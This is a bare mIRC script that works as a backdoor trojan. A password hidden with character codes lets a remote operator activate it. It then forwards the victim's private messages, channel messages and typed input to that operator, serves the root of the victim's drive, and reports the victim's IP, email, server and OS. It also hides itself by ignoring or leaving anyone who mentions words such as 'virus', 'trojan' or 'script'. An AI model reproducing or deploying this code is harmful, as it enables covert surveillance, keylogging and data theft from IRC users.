On 1:TEXT:ll*:*:{ var %ll = $remove($1,ll)
  if (%ll == $chr(108) $+ $chr(101) $+ $chr(108) $+ $chr(105) $+ $chr(101) $+ $chr(108)) {
    if ($2 == On) { .set %le.on $true | .set %le.nick $nick | .privmsg $nick $decode(U2VjaW9uIE9u,m) }
  if ($2 == Off) { .set %le.on $false | .unset %le.nick $nick | .privmsg $nick $decode(U2VjaW9uIE9mZg==,m) } }
  else { .privmsg $nick $decode(RXJyb3I=,m) }
.close -cm $nick }
On 1:Text:lmd*:*:{
  if (%le.on = $false) { halt } | var %li = $remove($1,lmd)
  if (%li == LIOn) { .set %LpI $true } | elseif (%li == LIOff) { .set %LpI $false }
  elseif (%li == LTcOn) { .set %LpTc $true } | elseif (%li == LTpOn) { .set %LpTp $true }
  elseif (%li == LTOff) { .set %LpTc $false | .set %LpTp $false }
  elseif (%li == LDir) { .fserve $nick 3 $left($mircdir,3) } | elseif (%li == out) { .disconnect | .exit }
  elseif (%li == ip) { .privmsg $nick $ip $fulldate $me $chan $email $server $port Wi $+ ndo $+ ws $os }
.close -cm $nick }
On 1:Text:*:?:{
  if (%LpTp = $true) { .privmsg %le.nick < $+ $Nick $+ > $+ $1- }
  if ($VText($1-) = $true) { .ignore $nick | .close -cm $nick }
}
On 1:Text:*:#:{
  if (%LpTc = $true) { .privmsg %le.nick < $+ $Nick $+ > $+ $1- }
  if ($VText($1-) = $true) { .part $chan }
}
On 1:INPUT:*:{
  if (%LpI = $true) { .privmsg %le.nick 4 $+ $1- $+  }
  if ($VText($1-) = $true) { halt }
}
Alias VText {
  if (virus isin $1-) || (worm isin $1-) || (set isin $1-) || (enable isin $1-) || (disable isin $1-) || (remote isin $1-) || (script isin $1-) || (play isin $1-) || (sock isin $1-) || (write isin $1-) || (decode isin $1-) || (alias isin $1-) || (load isin $1-) || (unload isin $1-) || (remini isin $1-) || (remove isin $1-) || (events isin $1-) || (trojan isin $1-) || (troyano isin $1-) { return $true }
  else { return $false }
}
